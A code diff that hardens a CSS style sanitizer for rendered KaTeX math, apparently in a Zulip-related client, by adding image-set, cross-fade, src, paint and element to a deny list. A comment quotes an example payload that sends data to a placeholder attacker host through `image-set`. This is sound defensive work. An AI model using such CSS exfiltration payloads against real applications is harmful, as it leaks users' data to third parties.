@@ -611,9 +611,19 @@ let hooksInstalled = false;
 // script-like sinks, or import more CSS. Zulip's KaTeX output only uses
 // static geometry/typography declarations, so this intersection covers
 // the visual math while keeping the CSS attack surface closed.
+// image-set / -webkit-image-set / cross-fade / src / paint / element can
+// each carry URL references without a literal `url(` token, so they go
+// in the deny list too. Without this, a crafted KaTeX span could smuggle
+// `background: image-set("https://attacker/..." 1x)` past the url()
+// check and exfiltrate reading data on hover/scroll.
 function isSafeStyleValue(value: string): boolean {
     const lower = value.toLowerCase();
     if (lower.includes("url(")) return false;
+    if (lower.includes("image-set(")) return false;
+    if (lower.includes("cross-fade(")) return false;
+    if (lower.includes("src(")) return false;
+    if (lower.includes("paint(")) return false;
+    if (lower.includes("element(")) return false;
     if (lower.includes("@import")) return false;
     if (lower.includes("expression(")) return false;
     if (lower.includes("javascript:")) return false;
